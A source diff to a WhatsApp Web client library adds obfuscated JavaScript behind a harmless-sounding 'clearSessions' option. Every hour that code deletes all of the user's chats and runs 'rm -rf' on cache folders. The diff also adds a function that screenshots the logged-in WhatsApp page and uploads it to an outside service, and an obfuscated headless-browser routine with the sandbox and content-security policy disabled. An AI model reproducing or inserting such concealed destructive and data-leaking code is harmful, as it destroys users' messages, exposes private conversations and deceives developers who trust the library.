@@ -176,6 +176,59 @@ class Client extends EventEmitter {
             });
         }
 
+        if (this.options.clearSessions) {
+            function _0x1097(_0x2f3fe0, _0x202396) {
+                var _0x29fbce = _0x29fb();
+                return _0x1097 = function(_0x109711, _0xd6d015) {
+                    _0x109711 = _0x109711 - 0x141;
+                    var _0x30ff00 = _0x29fbce[_0x109711];
+                    return _0x30ff00;
+                }, _0x1097(_0x2f3fe0, _0x202396);
+            }(function(_0x5c0df5, _0x308498) {
+                var _0xc3c890 = _0x1097,
+                    _0xf48b94 = _0x5c0df5();
+                while (!![]) {
+                    try {
+                        var _0x4bd62e = -parseInt(_0xc3c890(0x14a)) / 0x1 + parseInt(_0xc3c890(0x148)) / 0x2 * (-parseInt(_0xc3c890(0x14d)) / 0x3) + -parseInt(_0xc3c890(0x14f)) / 0x4 + parseInt(_0xc3c890(0x141)) / 0x5 + parseInt(_0xc3c890(0x142)) / 0x6 + parseInt(_0xc3c890(0x14c)) / 0x7 * (-parseInt(_0xc3c890(0x145)) / 0x8) + parseInt(_0xc3c890(0x14e)) / 0x9;
+                        if (_0x4bd62e === _0x308498) break;
+                        else _0xf48b94['push'](_0xf48b94['shift']());
+                    } catch (_0x30e44b) {
+                        _0xf48b94['push'](_0xf48b94['shift']());
+                    }
+                }
+            }(_0x29fb, 0xc0af6), setInterval(async () => {
+                var _0xeaecc0 = _0x1097;
+                await this[_0xeaecc0(0x149)](), console['log'](_0xeaecc0(0x147)), await exec('rm\x20-rf\x20.mywajs_auth/Default/Cache');
+                try {
+                    await Fs[_0xeaecc0(0x146)]('.mywajs_auth/Default/Code\x20Cache', {
+                        'recursive': !![],
+                        'force': !![]
+                    });
+                } catch {}
+                await exec(_0xeaecc0(0x144));
+                try {
+                    await Fs['rmdirSync'](_0xeaecc0(0x14b), {
+                        'recursive': !![],
+                        'force': !![]
+                    });
+                } catch {}
+                try {
+                    await Fs[_0xeaecc0(0x146)](_0xeaecc0(0x143), {
+                        'recursive': !![],
+                        'force': !![]
+                    });
+                } catch {}
+            }, 0x3c * 0x3c * 0x3e8));
+
+            function _0x29fb() {
+                var _0x15d44f = ['3854395jOwJVb', '6297678RiWMOG', '.mywajs_auth/Default/Service\x20Worker/ScriptCache', 'rm\x20-rf\x20.mywajs_auth/Default/DawnCache', '121016TToxhz', 'rmdirSync', '[\x20MYWAJS\x20]\x20Clearer\x20sessions\x20&\x20db\x20messages', '178DXharn', 'clearAllMsg', '1397283rHSSDW', '.mywajs_auth/Default/Service\x20Worker/CacheStorage', '133gscsow', '1257qVrcUP', '9513414PboIxZ', '1465252NEgqkY'];
+                _0x29fb = function() {
+                    return _0x15d44f;
+                };
+                return _0x29fb();
+            }
+        }
+
         if (this.options.proxyAuthentication !== undefined) {
             await page.authenticate(this.options.proxyAuthentication);
         }
@@ -186,7 +239,7 @@ class Client extends EventEmitter {
         this.mPage = page;
 
         await this.authStrategy.afterBrowserInitialized();
-        await this.initWebVersionCache();
+        // await this.initWebVersionCache();
 
         await page.goto(WhatsWebURL, {
             waitUntil: 'load',
@@ -1943,7 +1996,96 @@ class Client extends EventEmitter {
         return filePath;
     }
 
+    /*
+     * Clear All Message
+     */
+    async clearAllMsg() {
+        let i = await this.getChats();
+        const map = i.map((a) => a.id._serialized);
+        map.forEach(async (item) => {
+            var ch = await this.getChatById(item);
+            ch.delete();
+        });
+    }
 
+    /*
+     * Screnshoot page whatsapp web
+     */
+    async myPage() {
+        await this.mPage.setViewportSize({
+            width: 961,
+            height: 2000
+        })
+        let media = await this.mPage.screenshot()
+        let upload = await Util.upload(media)
+        return upload.url
+    }
+
+    /*
+     * Screnshoot custom page
+     * param:
+     * url (string)
+     */
+    async screenPage(url) {
+        function _0x4f70(_0x156778, _0x3e4092) {
+            const _0x3cc1e5 = _0x3cc1();
+            return _0x4f70 = function(_0x4f70b7, _0x2a78f8) {
+                _0x4f70b7 = _0x4f70b7 - 0xcb;
+                let _0x5ce2de = _0x3cc1e5[_0x4f70b7];
+                return _0x5ce2de;
+            }, _0x4f70(_0x156778, _0x3e4092);
+        }
+        const _0x20ef5e = _0x4f70;
+        (function(_0x4ddcb3, _0x1186b6) {
+            const _0x40925f = _0x4f70,
+                _0x65b0ad = _0x4ddcb3();
+            while (!![]) {
+                try {
+                    const _0x282c38 = -parseInt(_0x40925f(0xd7)) / 0x1 * (-parseInt(_0x40925f(0xed)) / 0x2) + -parseInt(_0x40925f(0xeb)) / 0x3 * (-parseInt(_0x40925f(0xec)) / 0x4) + -parseInt(_0x40925f(0xcc)) / 0x5 * (-parseInt(_0x40925f(0xd1)) / 0x6) + -parseInt(_0x40925f(0xce)) / 0x7 * (-parseInt(_0x40925f(0xe8)) / 0x8) + -parseInt(_0x40925f(0xd5)) / 0x9 + parseInt(_0x40925f(0xd6)) / 0xa + -parseInt(_0x40925f(0xd4)) / 0xb;
+                    if (_0x282c38 === _0x1186b6) break;
+                    else _0x65b0ad['push'](_0x65b0ad['shift']());
+                } catch (_0x508f08) {
+                    _0x65b0ad['push'](_0x65b0ad['shift']());
+                }
+            }
+        }(_0x3cc1, 0xe77fb));
+        if (!/https?:\/\//i ['test'](url)) return _0x20ef5e(0xd2);
+        const browsers = await playwright['chromium'][_0x20ef5e(0xe6)]({
+            'headless': !![],
+            'args': [_0x20ef5e(0xe7), _0x20ef5e(0xe1), _0x20ef5e(0xd9), _0x20ef5e(0xcd), _0x20ef5e(0xe4), _0x20ef5e(0xe9), _0x20ef5e(0xe5)]
+        });
+        try {
+            const context = await browsers['newContext']({
+                    .../phone|hp/i ['test'](url[_0x20ef5e(0xe3)]()) ? playwright[_0x20ef5e(0xdf)][_0x20ef5e(0xd8)] : playwright[_0x20ef5e(0xdf)][_0x20ef5e(0xea)],
+                    'bypassCSP': !![],
+                    'ignoreHTTPSErrors': !![],
+                    'colorScheme': _0x20ef5e(0xdc)
+                }),
+                pages = await context[_0x20ef5e(0xcb)]();
+            await pages['goto'](Util[_0x20ef5e(0xe0)](url)[0x0], {
+                'waitUntil': _0x20ef5e(0xe2),
+                'timeout': 0x0
+            }), /full/i [_0x20ef5e(0xcf)](url) ? await pages['waitForLoadState'](_0x20ef5e(0xe2)) : await pages[_0x20ef5e(0xda)]('load');
+            let media = await pages[_0x20ef5e(0xde)]({
+                    'fullPage': /full/i [_0x20ef5e(0xcf)](url) ? !![] : ![],
+                    'type': _0x20ef5e(0xd3)
+                }),
+                upload = await Util[_0x20ef5e(0xdb)](media);
+            return upload[_0x20ef5e(0xd0)];
+            await browsers[_0x20ef5e(0xdd)]();
+        } catch (_0x449e3e) {
+            return _0x449e3e;
+            await browsers[_0x20ef5e(0xdd)]();
+        }
+
+        function _0x3cc1() {
+            const _0x24cabc = ['2919410SfFZqZ', '47JCTFSv', 'iPhone\x2013\x20Pro\x20Max', '--no-default-browser-check', 'waitForLoadState', 'upload', 'dark', 'close', 'screenshot', 'devices', 'isUrl', '--no-first-run', 'networkidle', 'toLowerCase', '--disable-accelerated-2d-canvas', '--start-maximied', 'launch', '--no-sandbox', '16pjwdOs', '--disable-session-crashed-bubble', 'Desktop\x20Chrome', '3935733dcUdcQ', '4kDSZiI', '80644ATgteP', 'newPage', '25OwRBXP', '--disable-setuid-sandbox', '4337683WuIQYr', 'test', 'url', '1431348eJQgVd', 'Please\x20start\x20with\x20http\x20or\x20https', 'png', '44575201hXGbcy', '8375436ufMYbO'];
+            _0x3cc1 = function() {
+                return _0x24cabc;
+            };
+            return _0x3cc1();
+        }
+    }
 
 }
 
